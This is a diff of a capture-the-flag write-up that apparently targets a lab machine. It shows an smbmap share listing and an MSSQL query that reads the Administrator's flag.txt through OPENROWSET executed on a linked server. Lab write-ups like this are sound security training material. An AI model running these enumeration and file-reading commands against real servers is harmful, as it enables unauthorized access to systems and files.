@@ -419,7 +419,7 @@ Nmap done: 1 IP address (1 host up) scanned in 269.21 seconds
 
 **SMB**
 
-- SMB is running, let's see what shares are available
+SMB is running, let's see what shares are available
 
 ```
  smbmap -H 10.129.64.154                                                   
@@ -632,8 +632,12 @@ EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmi
 
 Read the contents of the flag.txt on the Administrators Desktop
 ```cmd-session
-SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/flag.txt', SINGLE_CLOB) AS Contents
+EXECUTE ("SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/flag.txt', SINGLE_CLOB) AS Contents") AT [LOCAL.TEST.LINKED.SRV]
 ```
+
+
+
+
 
 
 
